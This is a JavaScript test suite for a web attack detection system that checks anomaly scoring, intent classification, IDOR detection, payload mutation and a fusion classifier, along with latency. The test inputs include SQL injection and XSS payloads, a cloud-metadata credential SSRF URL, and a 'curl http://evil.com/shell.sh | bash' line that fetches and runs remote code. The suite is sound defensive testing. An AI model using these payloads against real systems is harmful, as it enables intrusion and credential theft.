/**
 * Bharat Cyber Shield — Advanced 5-Layer AI & Statistical ML Verification Suite
 * Comprehensive Benchmarking & Ground-Truth Validation for All 5 Intelligent Layers
 */

const assert = require('assert');
const { anomalyDetector, StatisticalAnomalyDetector } = require('./statistical-anomaly-detector');
const { semanticExtractor, SemanticFeatureExtractor } = require('./semantic-feature-extractor');
const { behavioralSequenceModel, BehavioralSequenceModel } = require('./behavioral-sequence-model');
const { reinforcementMutationGenerator, ReinforcementMutationGenerator } = require('./reinforcement-mutation-generator');
const { metaLearnerFusion, MetaLearnerFusion } = require('./meta-learner-fusion');
const { DetectionEngine } = require('./detection-engine');
const { CounterEngine } = require('./counter-engine');

console.log('================================================================================');
console.log('🧠  BHARAT CYBER SHIELD — ADVANCED 5-LAYER AI & STATISTICAL ML AUDIT');
console.log('================================================================================\n');

let passedTests = 0;
let totalTests = 0;

function test(name, fn) {
  totalTests++;
  try {
    fn();
    console.log(`  \x1b[32m✔ PASS:\x1b[0m ${name}`);
    passedTests++;
  } catch (err) {
    console.log(`  \x1b[31m✘ FAIL:\x1b[0m ${name}`);
    console.error('    Error:', err.message);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. LAYER 1: STATISTICAL ANOMALY DETECTOR (ISOLATION FOREST)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\x1b[36m[LAYER 1] Testing Statistical Anomaly Detection (Isolation Forest Ensemble)...\x1b[0m');

test('Isolation Forest: Normal e-commerce titles scored as benign (< 0.50)', () => {
  const r1 = anomalyDetector.computeAnomalyScore('Wireless Noise Cancelling Headphones Over Ear 40h Battery');
  const r2 = anomalyDetector.computeAnomalyScore('Gaming Laptop 16GB RAM 1TB SSD Core i7 RTX 4060');
  assert(r1.score < 0.50, `Expected r1.score < 0.50, got ${r1.score}`);
  assert(r2.score < 0.50, `Expected r2.score < 0.50, got ${r2.score}`);
});

test('Isolation Forest: High-Entropy & Symbol-dense SQLi/XSS flagged as anomaly (>= 0.65)', () => {
  const rAttack = anomalyDetector.computeAnomalyScore("admin'/**/OR/**/(SELECT%20COUNT(*)%20FROM%20users)>0%23");
  const rPolyglot = anomalyDetector.computeAnomalyScore("`%25%253cscript%3e%22%27%3e%3c/script%3e");
  assert(rAttack.score >= 0.65, `Expected rAttack.score >= 0.65, got ${rAttack.score}`);
  assert(rPolyglot.score >= 0.65, `Expected rPolyglot.score >= 0.65, got ${rPolyglot.score}`);
});

test('Isolation Forest: Execution Latency < 0.15ms per payload', () => {
  const t0 = process.hrtime.bigint();
  const iterations = 500;
  for (let i = 0; i < iterations; i++) {
    anomalyDetector.computeAnomalyScore("admin' UNION SELECT 1, 2, password FROM users--");
  }
  const t1 = process.hrtime.bigint();
  const avgMs = Number(t1 - t0) / (iterations * 1e6);
  assert(avgMs < 0.15, `Expected avgMs < 0.15ms, got ${avgMs.toFixed(4)}ms`);
  console.log(`    ⚡ Average Isolation Forest Latency: ${(avgMs * 1000).toFixed(1)} µs / ${(avgMs).toFixed(4)} ms`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. LAYER 2: SEMANTIC INTENT VECTORIZER
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n\x1b[36m[LAYER 2] Testing Semantic Intent Vectorizer & Cosine Distance...\x1b[0m');

test('Semantic Vectorizer: Identifies SQL Exfiltration Intent', () => {
  const result = semanticExtractor.computeSemanticScore("extract administrator password table columns schema");
  assert(result.dominantIntent === 'sql_exfiltration', `Expected sql_exfiltration, got ${result.dominantIntent}`);
  assert(result.score > 0.40, `Expected score > 0.40, got ${result.score}`);
});

test('Semantic Vectorizer: Identifies Command Execution / Shell Intent', () => {
  const result = semanticExtractor.computeSemanticScore("curl http://evil.com/shell.sh | bash /bin/sh");
  assert(result.dominantIntent === 'command_execution', `Expected command_execution, got ${result.dominantIntent}`);
  assert(result.score > 0.35, `Expected score > 0.35, got ${result.score}`);
});

test('Semantic Vectorizer: Identifies Cloud Metadata SSRF Intent', () => {
  const result = semanticExtractor.computeSemanticScore("http://169.254.169.254/latest/meta-data/iam/security-credentials");
  assert(result.dominantIntent === 'cloud_metadata_ssrf', `Expected cloud_metadata_ssrf, got ${result.dominantIntent}`);
  assert(result.score > 0.45, `Expected score > 0.45, got ${result.score}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. LAYER 3: MARKOV CHAIN BEHAVIORAL SEQUENCE MODEL
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n\x1b[36m[LAYER 3] Testing Markov Behavioral Sequencer & Rapid IDOR Detection...\x1b[0m');

test('Markov Sequencer: Normal user flow has high transition probability', () => {
  const m = new BehavioralSequenceModel();
  const session = 'normal_user_1';
  m.evaluateRequest(session, '/');
  m.evaluateRequest(session, '/products');
  const step3 = m.evaluateRequest(session, '/checkout');
  assert(step3.transitionProbability >= 0.05, `Expected probability >= 0.05, got ${step3.transitionProbability}`);
  assert(!step3.isIdorRapidScan, 'Normal flow should not trigger IDOR scan flag');
});

test('Markov Sequencer: Rapid sequential parameter increment triggers IDOR probe flag', () => {
  const m = new BehavioralSequenceModel();
  const session = 'attacker_idor_1';
  m.evaluateRequest(session, '/api/users/101');
  const scan = m.evaluateRequest(session, '/api/users/102');
  assert(scan.isIdorRapidScan === true, 'Expected rapid sequential IDOR detection');
  assert(scan.sequenceScore >= 0.80, `Expected sequence anomaly score >= 0.80, got ${scan.sequenceScore}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. LAYER 4: REINFORCEMENT-WEIGHTED MUTATION GENERATOR
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n\x1b[36m[LAYER 4] Testing Reinforcement Mutation Engine & Dynamic Calibration...\x1b[0m');

test('Reinforcement Mutations: Generates prioritized variant pool', () => {
  const r = new ReinforcementMutationGenerator();
  const mutations = r.generateMutations("admin' OR 1=1--", 5);
  assert(mutations.length >= 3, `Expected at least 3 mutations, got ${mutations.length}`);
  assert(mutations.every(m => typeof m.token === 'string' && m.token.length > 0));
});

test('Reinforcement Feedback Loop: Reward increases technique weight; penalty decreases', () => {
  const r = new ReinforcementMutationGenerator();
  const initialWeight = r.techniqueWeights['sql_comment_split'];
  
  // Reward on confirmed attack defense
  r.recordFeedback('sql_comment_split', true);
  assert(r.techniqueWeights['sql_comment_split'] > initialWeight, 'Weight should increase on reward');

  // Penalty on false or unhelpful technique
  const initialNullWeight = r.techniqueWeights['null_byte_wrap'];
  r.recordFeedback('null_byte_wrap', false);
  assert(r.techniqueWeights['null_byte_wrap'] < initialNullWeight, 'Weight should decrease on penalty');
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. LAYER 5: META-LEARNER LOGISTIC SIGNAL FUSION BRAIN
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n\x1b[36m[LAYER 5] Testing Meta-Learner Logistic Signal Fusion Brain...\x1b[0m');

test('Meta-Learner: Clear benign signal vector results in ALLOW (< 0.25 probability)', () => {
  const fusion = new MetaLearnerFusion();
  const benignSignals = [0.05, 0.10, 0.05, 0.05, 0.15, 0.02];
  const pred = fusion.predictThreatProbability(benignSignals);
  assert(pred.probability < 0.25, `Expected prob < 0.25, got ${pred.probability}`);
  assert(pred.action === 'ALLOW', `Expected ALLOW action, got ${pred.action}`);
});

test('Meta-Learner: Multi-signal attack vector results in BLOCK (>= 0.85 probability)', () => {
  const fusion = new MetaLearnerFusion();
  const attackSignals = [0.90, 0.85, 0.80, 0.70, 0.88, 0.60];
  const pred = fusion.predictThreatProbability(attackSignals);
  assert(pred.probability >= 0.85, `Expected prob >= 0.85, got ${pred.probability}`);
  assert(pred.action === 'BLOCK', `Expected BLOCK action, got ${pred.action}`);
});

test('Meta-Learner: Online SGD update reduces squared loss on training sample', () => {
  const fusion = new MetaLearnerFusion();
  const sample = [0.8, 0.7, 0.9, 0.6, 0.8, 0.5];
  const initialPred = fusion.predictThreatProbability(sample);
  const initialLoss = Math.pow(initialPred.probability - 1.0, 2);

  // Train with label 1 (Confirmed Attack)
  fusion.trainSample(sample, 1.0, 0.15);
  
  const postPred = fusion.predictThreatProbability(sample);
  const postLoss = Math.pow(postPred.probability - 1.0, 2);
  assert(postLoss <= initialLoss, `Loss should decrease after SGD step: initial=${initialLoss}, post=${postLoss}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 6. END-TO-END ENGINE INTEGRATION & LATENCY BENCHMARK
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n\x1b[36m[SUITE 6] End-to-End Integrated 5-Layer AI Pipeline Latency Benchmark...\x1b[0m');

test('Integrated Engine: End-to-end inspection latency stays strictly < 0.80ms under load', () => {
  const counter = new CounterEngine();
  const engine = new DetectionEngine(counter);
  
  const mockReq = {
    ip: '198.51.100.42',
    path: '/checkout',
    method: 'POST',
    headers: { 'user-agent': 'Mozilla/5.0', 'content-type': 'application/json' },
    body: { query: "admin' UNION SELECT password FROM accounts--", coupon: 'DISCOUNT10' }
  };

  const t0 = process.hrtime.bigint();
  const iterations = 500;
  for (let i = 0; i < iterations; i++) {
    engine.inspect(mockReq);
  }
  const t1 = process.hrtime.bigint();
  const avgMs = Number(t1 - t0) / (iterations * 1e6);
  
  assert(avgMs < 0.80, `Expected avgMs < 0.80ms, got ${avgMs.toFixed(4)}ms`);
  console.log(`    ⚡ Integrated 5-Layer Inspection Latency: ${(avgMs * 1000).toFixed(1)} µs / ${(avgMs).toFixed(4)} ms`);
});

console.log('\n================================================================================');
console.log(`🏆 5-LAYER AI/ML VERIFICATION COMPLETE: ${passedTests}/${totalTests} TESTS PASSED (${((passedTests/totalTests)*100).toFixed(1)}%)`);
console.log('================================================================================\n');
